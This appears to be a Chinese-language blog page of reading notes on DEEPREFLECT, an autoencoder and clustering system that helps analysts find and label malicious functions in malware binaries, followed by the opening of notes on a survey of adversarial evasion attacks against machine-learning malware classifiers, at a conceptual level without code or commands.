<li><font color="red"><strong>一个半监督聚类模型，它使用从分析人员的日常工作流程中获得的少量标签对识别的函数进行分类</strong></font></li>
</ul>
<p><strong>为了定位（locate）二进制文件中的恶意软件组件，我们使用自动编码器(autoencoder，AE)</strong>。AE是一种基于神经网络的机器学习模型，<strong>其任务是将其输入重构为输出（编码还原）</strong>。由于网络内层存在压缩，AE被迫学习训练分布中的关键概念。我们的直觉是，如果在良性二进制文件上训练AE，它将很难重建恶意二进制文件（即我们没有训练它的样本）。自然地，AE将无法重建（reconstruct）包含恶意行为的二进制数据区域（在良性样本中是不可见或罕见的）。<font color="red"><strong>因此（Thus），重构错误可以用来识别恶意软件中的恶意组件</strong></font>。此外，由于AE是以无监督的方式训练的，我们不需要数百万标记的样本，公司可以利用自己的恶意软件二进制数据集。</p>
<p><strong>为了对定位的恶意软件组件进行分类</strong>，我们：</p>
<ul>
<li>对恶意软件样本中所有已识别的函数进行聚类</li>
<li>使用分析人员在日常工作流程中所做的注释（即少量人工分析的函数行为标签）来标记聚类结果</li>
</ul>
<p><strong>这种方法是半监督的，因为每个类簇（cluster）只需要少数函数的行为标签（如三个）即可将大多数标签分配给整个集群</strong>。随着时间推移，我们可以将AE识别的函数映射到聚类模型来预测函数的类别（如，C&amp;C、特权升级等），即认为函数和最接近的类簇有相同的行为标签。这反过来又节省了分析人员的时间，因为他们不必一次又一次地对相同的代码进行逆向工程。</p>
<p>注意，无监督 AE
为恶意软件分析人员提供了即时实用程序，无需训练或使用半监督聚类模型。这是因为它：</p>
<ul>
<li><strong>通过对最相关的函数进行排序（重构误差）来吸引分析师的注意力</strong></li>
<li>过滤掉可能需要花费分析师数小时或数天时间来解释的函数</li>
</ul>
<blockquote>
<p>DEEPREFLECT根据我们是为恶意软件分析人员的反馈进行设计和修改的，并评估其有效性和实用性。</p>
<p><strong>我们评估了DEEPREFLECT的性能，包括五个工作：</strong></p>
<ul>
<li>识别恶意软件中的恶意活动</li>
<li>聚类相关的恶意软件组件</li>
<li>将分析人员的注意力集中在重要事情上</li>
<li>揭示不同恶意软件家族之间的共享行为</li>
<li>处理涉及混淆的对抗性攻击</li>
</ul>
</blockquote>
<h4><span id="23-创新contribution">2.3 创新（Contribution）</span></h4>
<p><strong>我们的贡献如下：</strong></p>
<ul>
<li><strong>提出了一个新颖的工具，它可以帮助恶意软件分析师：(1)
在静态恶意软件样本中自动定位和识别恶意行为，(2)
洞察分析不同恶意软件家族之间的功能关系。</strong></li>
<li><strong>提出一种在静态分析中使用机器学习的新颖实用方法</strong>：（1)
AE训练是在一种无监督方式下进行的，<strong>无需为系统标注任何样本</strong>，就可以产生突出显示恶意软件组件的实用程序，(2)
分类是以半监督方式完成，<strong>具有最小的干预</strong>：分析人员的常规工作流的注释用作标签，群集中的大多数标签用于对相关的恶意软件组件进行分类。</li>
<li>本文提出了一种解释框架（如我们提出的 AE 或
SHAP）定位恶意软件重要部分的方法，该方法可以<strong>映射回原始二进制或控制流图的特征</strong>。</li>
</ul>
<h3><span id="3-scope-amp-overview">3 <strong>Scope &amp; Overview</strong></span></h3>
<h4><span id="31-motivation">3.1 Motivation</span></h4>
<p><img src="https://lzy-picture.oss-cn-beijing.aliyuncs.com/img/202304191550446.png" alt="图片" style="zoom: 67%;"></p>
<p><font color="red"><strong>图1展示了一个典型的恶意软件分析师Molly的工作流程</strong>
</font>。当给定一个恶意软件样本，Molly的任务是了解该样本在做什么，以便她写一份技术报告并改进公司的检测系统，从而在未来识别该类样本。</p>
<ol type="1">
<li><strong>首先查询VT（virtotul）和其他组织</strong>，以确定他们以前是否见过这个特定的样本，然而并没有</li>
<li>在一个自定义的<strong>沙箱中执行样本以了解其动态行为</strong>，然而没有显示任何恶意行为或拒绝执行；运行一些内部工具，诱使恶意软件执行其隐藏的行为，但仍无效时；</li>
<li>尝试<strong>脱壳（unpacking）</strong>和<strong>静态逆向分析恶意样本</strong>，以了解其潜在行为</li>
<li><font color="red"><strong>在反汇编程序（IDA Pro 或
BinaryNinja）中打开脱壳后的样本，被数千个函数淹没，接着运行各种静态签名检测工具来识别恶意软件的某些特定恶意组件，但仍无效</strong></font></li>
<li>逐个<strong>查看每个函数（可能通过 API
调用和字符串过滤）以尝试了解它们的行为</strong></li>
<li><strong>在分析样本的行为后，撰写分析报告（包含基本信息、IOC、静态签名等）</strong></li>
</ol>
<p>然而，当新的样本出现时，Molly需要重复同样的任务。由于这种重复的体力劳动，这项工作对Molly来说变得单调乏味和耗时。<font color="red">
<strong>DEEPREFLECT旨在减轻恶意分析师的分析工作，能逆向一个未知的恶意软件样本，从而减轻他们繁重的任务，并为相似的函数标注行为标签。</strong></font></p>
<h4><span id="32-proposed-solution">3.2 Proposed Solution</span></h4>
<p>我们提出了<strong>DEEPREFLECT</strong>，该工具能：</p>
<ul>
<li><p><strong>定位恶意软件binary中的恶意函数</strong></p>
<blockquote>
<p>locates malicious functions within a malware binary</p>
</blockquote></li>
<li><p><strong>描述这些函数的行为</strong></p>
<blockquote>
<p>describes the behaviors of those functions</p>
</blockquote></li>
</ul>
<p>虽然分析人员可能首先尝试通过搜索特定的字符串和API调用来静态地识别行为，但这些行为很容易被分析人员混淆或隐藏（
obfuscated or
hidden）。<strong>DEEPREFLECT没有做出这样的假设，并试图通过控制流图(control-flow
graph，CFG)特性和API调用（API
calls）的组合来识别这些相同的行为</strong>。</p>
<p><font color="red">
<strong>DEEPREFLECT通过学习正常情况下良性的二进制函数来工作</strong></font>。因此，任何异常都表明这些函数不会出现在良性二进制文件中，而可能被用于恶意行为中。这些异常函数更可能是恶意函数，分析师可以只分析它们，从而缩小工作范围。如图5所示，DEEPREFLECT将分析师必须分析的函数数量平均减少了
85%。此外，实验表明我们的方法优于旨在实现相同目标的基于签名的技术。</p>
<p><img src="https://lzy-picture.oss-cn-beijing.aliyuncs.com/img/202304191550151.png" alt="图片" style="zoom:67%;"></p>
<h4><span id="33-research-goals">3.3 Research Goals</span></h4>
<p>本文有四个主要目标：</p>
<ul>
<li>准确地识别恶意软件样本中的恶意活动</li>
<li>帮助分析人员在静态分析恶意软件样本时集中注意力</li>
<li><strong>处理新的（不可见的）恶意软件家族</strong></li>
<li><strong>深入了解恶意软件家族的关系和趋势</strong></li>
</ul>
<h3><span id="4-模型设计">4、模型设计</span></h3>
<h4><span id="41-总体框架">4.1 总体框架</span></h4>
<p><strong>DEEPREFLECT的目标是识别恶意软件二进制中的恶意函数</strong>。在实践中，<font color="red"><strong>它通过定位异常基本块（感兴趣区域
regions of
interest，RoI)来识别可能是恶意的函数</strong></font>。然后，分析人员必须确定这些函数是恶意行为还是良性行为。DEEPREFLECT有两个主要步骤，如图2所示：</p>
<ul>
<li><strong>RoI检测（RoI
detection）</strong>：通过AE（AutoEncoder）来执行的</li>
<li><strong>RoI注释（RoI
annotation）</strong>：通过对每个函数的所有RoI聚类，并将标记聚类结果来执行注释。注意，一个函数可能有多个ROI，用每个函数自己的ROI的均值表示该函数，然后对函数聚类</li>
</ul>
<figure>
<img src="https://lzy-picture.oss-cn-beijing.aliyuncs.com/img/202304191550631.png" alt="图片">
<figcaption aria-hidden="true">图片</figcaption>
</figure>
<h5><span id="1术语-terminology">（1）术语 Terminology</span></h5>
<p><strong>首先定义恶意行为（malicious
behaviors）的含义</strong>。我们根据识别恶意软件源代码的<strong>核心组件</strong>（例如，拒绝服务功能、垃圾邮件功能、键盘记录器功能、命令和控制C&amp;C功能、利用远程服务等）来生成真实情况（ground-truth）。<font color="red"><strong>通过MITRE
ATT&amp;CK框架描述</strong></font>，如表3所示。</p>
<figure>
<img src="https://lzy-picture.oss-cn-beijing.aliyuncs.com/img/202304191550843.png" alt="图片">
<figcaption aria-hidden="true">图片</figcaption>
</figure>
<p><strong>然而，当静态逆向工程评估恶意软件二进制文件时（即在野生恶意软件二进制
in-the-wild malware
binaries），我们有时无法肯定地将观察到的低级函数归因于更高级别的描述</strong>。</p>
<p>例如，恶意软件可能会因为许多不同的原因修改注册表项，但有时确定哪个注册表项因什么原因而被修改是很困难的，因此只能粗略地标记为“<font color="red"><code>防御逃避：修改注册表（Defense Evasion: Modify Registry）</code>”
</font>。即使是像CAPA这样的现代工具，也能识别出这些类型的模糊标签。<strong>因此，在我们的评估中，我们将“恶意行为”表示为可由MITRE
ATT&amp;CK框架描述的函数。</strong></p>
<h5><span id="2-roi-detection">（2） <strong>RoI Detection</strong></span></h5>
<p><strong>检测的目标是自动识别恶意软件二进制文件中的恶意区域</strong>。例如，我们希望检测C&amp;C逻辑的位置，而不是检测该逻辑的特定组件（例如，网络API调用connect()、send()
和
recv()）。<strong>RoI检测的优点是分析人员可以快速定位启动和操作恶意行为的特定代码区域</strong>。先前的工作只关注于创建临时签名，简单地将二进制文件标识为恶意软件或仅基于API调用的某些函数。这对于分析人员扩大他们的工作特别有用（即不仅仅依赖手动逆向工程和领域专业知识）。</p>
<h5><span id="3-roi-annotation"><strong>(3) RoI Annotation</strong></span></h5>
<p><strong>注释的目标是自动标记包含RoI的函数的行为，即识别恶意函数在做什么</strong>。由于分析人员为标记集群所执行的初始工作是一个长尾分布。也就是说，只需要前期做比较重要的工作，随着时间推移，工作量会减少。这个过程的优点很简单：它为分析人员提供了一种自动生成未知样本的报告及见解的方法。例如，如果恶意软件示例的变体包含与之前的恶意软件示例相似的逻辑（但对于分析人员来说看起来不同以至于不熟悉），我们的工具为他们提供了一种更快实现这一点的方法。</p>
<h4><span id="42-roi-detection">4.2 RoI Detection</span></h4>
<p>首先介绍了AutoEncode（AE）神经网络。此外，先前的工作已经证明，当自动编码器在良性分布上进行训练时，AE可以检测到恶意（异常）行为。我们的假设是，与良性二进制文件相比，恶意软件二进制文件将包含相似但独特的功能。</p>
<p>当使用大量良性样本训练AE后，给定一个随机的样本，可以利用公式(2)计算，超过<strong>MSE</strong>的即认为是恶意区域，突出显示ROI异常基本块。与先前识别整个样本为恶意区域的工作相比，我们识别了每个样本中的恶意区域。具体而言，我们计算的
<code>localized MSE</code> 定义如下： <span class="math display">\[
\operatorname{LMSE}(x, \hat{x})=\left(x^{(i)}-\hat{x}^{(i)}\right)^{2}
\]</span></p>
<h4><span id="1features"><font color="red">
（1）<strong>Features</strong></font></span></h4>
<p>为了在二进制样本中定位恶意行为的位置，编码使用的特征必须一对一的映射回原样本。<strong>因此，作者将每个二进制文件表示为一个
m×c
的矩阵，该矩阵使用c个静态特征捕获前m个基本块以总结样本的behavior</strong>。<strong>m设置为20k个基本块，是因为95%的数据集样本具有20k或者更少的基本块，
c设置为18个特征</strong>。<strong>基本块</strong>通常是以控制传输指令结尾的一系列指令。当然，根据反汇编程序的不同，基本块可能会有不同的表示，因此这种严格的定义可能不适用于所有静态恶意软件分析系统。</p>
<p>我们特征（c）的灵感来自于先前工作中发现的特征，即<strong>属性控制流图（attributed
control flow
graph，ACFG）</strong>特征<strong>[23,75]</strong>。在这些工作中，ACFG特征被选择来执行二进制相似性，因为它们假设这些特征(由结构和数字CFG特征组成)将在多个平台和编译器上是一致的。</p>
<blockquote>
<p><strong>[23] Scalable graph-based bug search for firmware images.
2016 CCS</strong></p>
<p><strong>[75] Neural Network-based Graph Embedding for Cross-Platform
Binary Code Similarity Detection. 2017 CCS</strong></p>
</blockquote>
<p>虽然可以说我们的目标是相似的（即识别二进制文件之间的异同），但我们专门为研究恶意软件定制了这些功能。特别是，我们选择了autoencoder要使用的功能，以捕获更高级别的行为。我们的特征包括每个<strong>基本块中的指令类型计数</strong>（为ACFG特征提取的指令类型的更详细形式）、<strong>CFG的结构特征</strong>和<strong>API调用类别</strong>（用于总结恶意软件程序行为[18]），将每个基本块总结如下：</p>
<h5><span id="astructural-characteristics"><font color="red">(a)
<strong>Structural Characteristics</strong> </font></span></h5>
<p><strong>结构特征2个</strong>，每个<strong>基本块的后代（offspring）数量</strong>和<strong>betweenness
score</strong>，可以描述不同功能的<strong>控制流结构</strong>，比如网络通信（connect,
send, recv）或文件加密（findfile, open, read, encrypt, write,
close）。如图所示:</p>
<p><img src="https://lzy-picture.oss-cn-beijing.aliyuncs.com/img/202304191550517.png" alt="image-20220602164403223" style="zoom:67%;"></p>
<blockquote>
<p>该恶意软件通过InternetOpenUrlA() 访问URL，通过CreateFileA()
创建文件，并通过InternetReadFile() 和WriteFile()
将从连接接收的数据写入文件。</p>
</blockquote>
<p><strong>(b) Arithmetic Instructions</strong></p>
<p><strong>算术指令3个</strong>，每个<strong>基本块基本数学、逻辑运算、位移指令的数量</strong>（“basic
math”, “logic operation”, and “bit
shifting”）。这些算术指令特征可以用来表示如何对更高层次的行为执行数学运算，以及数字如何与函数交互。例如，加密函数可能包含大量的xor指令，混淆函数可能包含逻辑和位移操作的组合等。<strong>我们从《英特尔体系结构软件开发人员手册》[26]中检索到这些说明</strong>。此外，我们还提供了一个恶意软件示例，在图中展示了这些类型的功能。</p>
<p><img src="https://lzy-picture.oss-cn-beijing.aliyuncs.com/img/202304191550537.png" alt="image-20220602164519015" style="zoom:67%;"></p>
<blockquote>
<p>此函数对数据执行各种按位操作。类似这样的复杂逻辑可以解释为执行某种除臭或解码，以隐藏恶意软件解释或收集的数据。</p>
</blockquote>
<p><strong>(c) Transfer Instructions</strong></p>
<p><strong>转移指令</strong>3个，每个基本块<strong>内堆栈操作，寄存器操作和端口操作的数量</strong>（“stack
operation”, “register operation”, and “port
operation”）。这些底层特征可描述更高级别函数的<strong>传输操作</strong>，比如函数的参数和返回值是如何与函数内其余数据交互的，从而描述更复杂的逻辑和数据操作。<strong>例如去混淆、解密函数可能设计更多move-related指令，C&amp;C逻辑设计更多堆栈相关指令</strong>。因为它调用了更多的内部/外部函数。我们同样从《英特尔体系结构软件开发人员手册》中检索到了这些说明</p>
<p><strong>(d) API Call Categories</strong></p>
<p><strong>API类别10个</strong>，我们使用的API调用特性是每个基本块中与<strong>“文件系统”、“注册表”、“网络”、“DLL”、“对象”、“进程”、“服务”、“同步”、“系统信息”和“时间”相关的API调用的数量</strong>。这些类别的灵感来自<strong>priorwork
for malware
clustering</strong>[18]。这些特性可用于表示执行恶意活动（如网络通信和文件系统、注册表和进程操作）所需的高级库操作。由于这些直接表示高级行为，因此它们对于理解函数的总体行为至关重要。<strong>下图显示了利用这些不同调用类型执行不同行为的恶意软件功能的示例。</strong></p>
<blockquote>
<p><strong>[18] Scalable, Behavior-Based Malware Clustering. NDSS
2009.</strong></p>
</blockquote>
<p><img src="https://lzy-picture.oss-cn-beijing.aliyuncs.com/img/202304191550690.png" alt="image-20220602164417162" style="zoom:67%;"></p>
<blockquote>
<p>此函数用于搜索具有特定扩展名（即doc、jpg等）的各种文件。然后将这些文件复制到单独的位置。此行为可能是针对其他恶意行为的设置，如数据外泄或勒索。</p>
</blockquote>
<p><strong>我们认为，与经典的ACFG功能相比，这些功能更适合恶意软件</strong>，因为（1）它们包括在priorwork中用于恶意软件检测的API调用（2）<strong>指令类别更细粒度，允许每个基本块中有更多的上下文</strong>（如前所述）以及（3）<font color="red"><strong>它们不依赖太容易规避攻击的字符串</strong></font>[77]。当然，如果有一个有动机的对手，任何机器学习模型都可能受到攻击和欺骗，从而产生错误和意外的输出。虽然我们的功能和模型也不例外，但我们认为它们足以产生可靠的模型（即，其行为符合预期），并使其变得足够困难，以至于对手必须广泛地工作以产生误导性的输入（如中所示 4.7).
有关对我们系统的潜在攻击的讨论，请参阅 5.</p>
<h4><span id="2模型">（2）模型</span></h4>
<p><strong>Autoencoder使用U-Net模型，U-Net的优点是其在编码器和解码器之间有跳过连接（skip
connections），对样本x可以跳过某些特征的压缩以在重构的x’中保持更高的保真度</strong>。</p>
<p>首先收集大量的良性样本，对每个binary抽取上述18个静态特征用于表示该binary。设有用feature表示的样本x，AE重构后得到x’，训练的目标是最小化重构损失，即输入x和输出x’之间的损失。</p>
<p><strong>RoI
Detection会在m个基本块中检测出一些异常基本块</strong>。这些基本块分别属于不同的函数，使用例如BinaryNinja的工具就可以确定ROI属于哪些函数，即认为这些函数可能是恶意函数，也就完成了恶意函数定位的任务。<strong>后续RoI
Annotation就是对这些函数聚类，完成恶意函数行为标记（分类）的任务。</strong></p>
<h4><span id="43-roi-annotation">4.3 RoI Annotation</span></h4>
<p><strong>给定一个新样本x，我们希望识别其每个函数的行为（类别），并将其报告给Molly</strong>。由于标记所有的函数都是不实用的，所以我们只注释了少量的函数，并使用聚类分析来传播结果。</p>
<h5><span id="1clusteringfeatures">（1）<strong>Clustering
Features</strong></span></h5>
<p>假设一组脱壳恶意软件，按上述特征提取方式（18种特征）得到每个binary的特征表示，其中一个binary为x。</p>
<p><strong>（2）Clustering Model</strong></p>
<p>使用PCA将特征数从18降维至5，然后使用HDBSCAN算法对5维特征聚类。</p>
<h3><span id="五-实现">五、实现</span></h3>
<p>接下来，我们将描述如何部署和使用它。</p>
<p><strong>(1) Initialization</strong></p>
<ul>
<li>首先对良性和恶意binaries脱壳</li>
<li>提取binary静态特征，形成20×18的矩阵</li>
<li><strong>用良性样本训练AutoEncoder</strong></li>
<li><strong>使用训练好的AE从恶意样本中提取ROIs，即恶意基本块位置</strong></li>
<li>计算恶意二进制中恶意函数的行为表示，加入聚类的训练集D</li>
<li>PCA降维并聚类生成C</li>
</ul>
<p>人工分析恶意软件手动打标，这些label注释到聚类训练集中，从而评估实验结果。换句话说，每个cluster只需要其中几个函数的label，就可确定整个cluster的label，即确定整个cluster中函数的恶意行为。</p>
<p><strong>(2) Execution</strong></p>
<p>当Molly收到一个新的样本x，DeepReflect会自动定位恶意函数并标注恶意行为。</p>
<ul>
<li><strong>对样本x执行脱壳（unpack）</strong></li>
<li>通过AutoEncoder获取ROIs</li>
<li>使用BinaryNinja以及ROIs确定恶意函数集合，然后计算恶意函数的行为表示</li>
<li>PCA模型降维</li>
<li>计算每个恶意函数最相近的集群，通过计算和聚类中心的距离实现</li>
<li>分配大数据集群注释给函数</li>
</ul>
<p>接下来，Molly分析highlighted functions，从而实现：</p>
<ul>
<li>obtains a better perspective on what the malware is doing</li>
<li>annotates any function labeled “unknown” with the corresponding
MITRE category (dynamically updating D)</li>
<li>observe shared relationships between other malware samples and
families by their shared
clusters（共享关系，分析恶意软件家族的相关性）</li>
</ul>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://powerlzy.github.io/posts/17HFC4S/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/cat_mac.jpg">
      <meta itemprop="name" content="lzy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="PowerLZY's Blog">
      <meta itemprop="description" content="相比到达的地方，同行的人更重要！">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | PowerLZY's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/17HFC4S/" class="post-title-link" itemprop="url">AI安全（3）A survey on practical adversarial examples for malware classifiers</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-07-29 20:42:22" itemprop="dateCreated datePublished" datetime="2021-07-29T20:42:22+08:00">2021-07-29</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-04-21 13:38:06" itemprop="dateModified" datetime="2023-04-21T13:38:06+08:00">2023-04-21</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E3%80%90draft%E3%80%91%E5%BA%94%E7%94%A8/" itemprop="url" rel="index"><span itemprop="name">【draft】应用</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E3%80%90draft%E3%80%91%E5%BA%94%E7%94%A8/%E5%AD%A6%E6%9C%AF%E5%89%8D%E6%B2%BF/" itemprop="url" rel="index"><span itemprop="name">学术前沿</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E3%80%90draft%E3%80%91%E5%BA%94%E7%94%A8/%E5%AD%A6%E6%9C%AF%E5%89%8D%E6%B2%BF/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>17k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>30 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3><span id="恶意软件的对抗样本综述"><strong>恶意软件的对抗样本综述：</strong></span></h3>
<h3><span id="asurvey-on-practical-adversarial-examples-for-malwareclassifiers"><strong>A
survey on practical adversarial examples for malware
classifiers</strong></span></h3>
<ul>
<li><p><strong>INTRODUCTION</strong></p></li>
<li><p><strong>BACKGROUND</strong></p>
<ul>
<li><strong>Machine learning for malware</strong></li>
<li><strong>Adversarial examples</strong></li>
</ul></li>
<li><p><strong>PRACTICAL ATTACKS</strong></p>
<ul>
<li><strong>Gradient-driven approaches</strong>
<ul>
<li><strong>Editing bytes and metadata</strong></li>
<li><strong>Code transformations</strong></li>
</ul></li>
<li><strong>Problem-driven approaches</strong>
<ul>
<li><strong>Editing bytes and metadata</strong></li>
<li><strong>Code transformations</strong></li>
</ul></li>
</ul></li>
<li><p><strong>DISCUSSION</strong></p>
<ul>
<li><p><strong>Challenges</strong></p>
<ul>
<li><p><strong>Threat models</strong></p></li>
<li><p><strong>Establishing baselines</strong></p></li>
</ul></li>
<li><p><strong>Possible research directions</strong></p>
<ul>
<li><strong>Defending against practical adversarial malware
examples</strong></li>
<li><strong>Relationships between obfuscation and adversarial
examples</strong></li>
<li><strong>Integration of static and dynamic analysis
techniques</strong></li>
</ul></li>
<li><p><strong>Other Survey and systematization of knowledge
papers</strong></p></li>
</ul></li>
<li><p><strong>CONCLUSION</strong></p></li>
<li><p><strong>ACKNOWLEDGMENTS</strong></p></li>
</ul>
<hr>
<h3><span id="abstract">ABSTRACT</span></h3>
<blockquote>
<p>基于机器学习的解决方案非常有助于解决处理大量数据的问题，例如恶意软件检测和分类。然而，人们发现，深层神经网络容易受到敌对示例的攻击，或故意干扰输入以导致错误标签的攻击。研究人员已经表明，可以利用此漏洞创建规避恶意软件样本。然而，许多提议的攻击并不生成可执行文件，而是生成特征向量。为了充分了解敌对示例对恶意软件检测的影响，我们回顾了针对生成可执行敌对恶意软件示例的恶意软件分类器的实际攻击。我们还讨论了该研究领域当前面临的挑战，以及改进建议和未来研究方向。</p>
</blockquote>
<h3><span id="1-introduction">1 INTRODUCTION</span></h3>
<blockquote>
<p>基于机器学习的解决方案非常有助于解决处理大量数据的问题，例如恶意软件检测和分类。然而，人们发现，深层神经网络容易受到敌对示例的攻击，或故意干扰输入以导致错误标签的攻击。研究人员已经表明，可以利用此漏洞创建规避恶意软件样本。然而，许多提议的攻击并不生成可执行文件，而是生成特征向量。为了充分了解敌对示例对恶意软件检测的影响，我们回顾了针对生成可执行敌对恶意软件示例的恶意软件分类器的实际攻击。我们还讨论了该研究领域当前面临的挑战，以及改进建议和未来研究方向。</p>
</blockquote>
<blockquote>
<p>然而，在2014年，Szegedy等人表明深层神经网络（DNN）容易受到对抗性攻击。Grosse等人进一步证明，这种漏洞也适用于基于机器学习的恶意软件检测器和分类器[29]。自这项工作以来，针对流行的基于机器学习的模型（如MalConv[62]）开发了许多攻击，但其中许多攻击并不实用。具体地说，许多攻击不会生成实际的恶意软件，而是生成一个特征向量，表示可能受干扰的恶意文件应该是什么样子以逃避检测。由于逆特征映射的困难，在给定特征向量的情况下生成可执行程序是不切实际的[59]。也就是说，特征提取过程不是唯一可逆的，也不能保证找到的解决方案将包含与原始恶意软件样本相同的程序逻辑。在这项工作中，我们回顾了针对基于机器学习的恶意软件分类器和检测器的实际攻击，或者针对这些导致可执行恶意软件的ML模型的攻击。在第2节中，我们介绍并定义了对抗性示例以及考虑这些示例的威胁模型。然后，我们在第3节回顾了恶意软件领域的实际对抗性示例研究。我们为该领域的未来方向提供建议，并在第4节讨论任何挑战。最后，我们在第5节总结。</p>
</blockquote>
<h3><span id="2-background">2 BACKGROUND</span></h3>
<h4><span id="21-machine-learning-formalware">2.1 Machine learning for
malware</span></h4>
<blockquote>
<p>检测恶意软件的经典方法是提取在受感染系统上发现的恶意样本的文件签名，并将其添加到签名数据库，也称为基于签名的检测[51]。对于这种方法，必须在整个样本以及相关样本的子集中搜索已知签名，因为恶意行为可以嵌入并交织在其他良性软件中。然而，由于基于特征码的检测依赖于捕获恶意软件样本，然后对其进行分析以生成新的特征码，因此它只能防御已知的攻击，并且只能尝试防御新的或模糊的恶意软件[67]。</p>
</blockquote>
<blockquote>
<p>基于机器学习的方法被提出作为这个问题的解决方案，因为它们能够预测新输入的标签。机器学习模型，如支持向量机（SVM）和均值聚类，用于恶意软件分类、检测和分析方法。在分类问题中，我们尝试将恶意软件样本分离为预定义的恶意软件系列。基于学习的模型基于由标记恶意软件样本组成的训练数据，推断新恶意软件样本的分类。检测问题可以看作是分类的一个子问题。对于检测，基于学习的模型用于在给定恶意和良性可执行文件时查找或检测恶意软件样本。由于检测是二进制分类的一种情况，基于学习的检测模型也可以称为分类器。分类和检测是训练数据标记时的监督算法。机器学习也可用于增强恶意软件分析。非监督聚类算法可用于学习恶意软件样本之间的新相似性[32]。此外，我们可以对基于学习的模型进行推理，以更好地理解恶意软件的恶意原因[7,20]。最近，随着深入学习方法研究的增加，研究人员开始利用卷积神经网络来分类和检测恶意软件[52,62]。</p>
</blockquote>
<h4><span id="211-static-features">2.1.1 Static Features</span></h4>
<blockquote>
<p>N-gram是目前流行的用于恶意软件分类和检测的功能。Kolter和Maloof提出使用各种机器学习模型，包括朴素贝叶斯分类器、决策树、支持向量机（SVM）和增强模型[37]，从PE恶意软件中提取最相关的=-克字节码进行分类。他们发现，除了分类之外，他们的模型还可以用于恶意软件检测.</p>
<p>McBoost是作为一种在搜索恶意软件时快速分析大量二进制文件的工具引入的，并采用了三步流程[58]。第一步是使用基于启发式的分类器和两个不同的基于n-gram的分类器的集合来检测打包器。如果检测到封隔器，则使用QEMU和动态分析对二进制文件进行解包。最后，使用一个单独的n-gram分类器来检测应该转发以进行额外分析的恶意软件。</p>
<p>Santos等人在2009年提出使用=-grams作为基于文件签名的方法的替代方案。在这样做的过程中，他们表明机器学习，特别是k近邻模型和=-grams可以成功地用于检测新的恶意软件样本[67]#-grams还与动态特征一起使用，以同时合并恶意软件的多个视图，而无需实际进行动态分析[5]。最近的工作，如为Kaggle
Microsoft恶意软件挑战提出的解决方案[64，78]，证明了字节和操作码=-grams的持续使用，分类准确率几乎为100%。</p>
<p>与使用操作码序列生成=gram类似，可以从程序的操作码跟踪中提取马尔可夫链。这样的马尔可夫链使用唯一的操作码作为其状态，并显示从一个操作码到另一个操作代码的转换概率。Anderson等人使用程序的马尔可夫链之间的相似性作为恶意软件检测的一个特征。类似地，Runwal等人[53]提出使用马尔可夫链之间的图相似性来检测嵌入式恶意软件，Shafiq等人[45]提出使用马尔科夫链来测量熵来检测恶意软件。</p>
<p>Jang等人介绍了BitShred，一种用于恶意软件分类和分析的工具[32]。BitShred使用位置敏感哈希对从样本中提取的=gram指纹进行哈希，以降低特征空间的维数。在k近邻模型中使用散列来对恶意软件样本进行聚类。此外，作者还表明BitShred可以用于改进以前的恶意软件检测和分类模型。例如，作者表明BitShred可以用于散列动态特征，例如Bayer等人[12]中生成的行为简档，以降低特征空间的维数。</p>
<p>Drebin对Android软件进行大规模静态分析，以提取硬件使用和请求、权限、API调用和网络信息等功能[7]。这些特征用于通过生成二进制指示符向量将样本映射到联合向量空间。这些二进制指示符向量被用作SVM的输入，SVM将样本标记为良性或恶意。重要的是，Drebin利用其模型的简单性，将模型的决策归因于特定的特征。这使得Drebin比基于复杂架构（如卷积神经网络）的恶意软件分类器和检测器更容易解释。</p>
<p><strong>【ember、+ 字节直方图】</strong></p>
<p><strong>【恶意软件图像】</strong>Nataraj等人提出使用恶意软件图像（二进制文件的黑白图像表示）来检测恶意软件[52]。从那时起，研究人员和商业杀毒软件都使用恶意软件图像来高精度检测恶意软件[23，26，78]。Nataraj等人使用恶意软件图像创建了一个特征向量，该向量将用作支持向量机的输入。然而，最近的工作也表明，使用原始图像作为卷积神经网络的输入是有效的[23，34，38，82]。</p>
<p><strong>【CFG控制流图】</strong>在开发静态功能方面也进行了研究，这些功能可以使用控制流图深入了解程序在运行时的行为。这项研究主要围绕构建控制流图和使用图匹配技术来检测恶意软件[13，16]。Ma等人在使用控制流图时采取了类似的方法，但提取了一系列API调用，试图模拟动态分析[46]。</p>
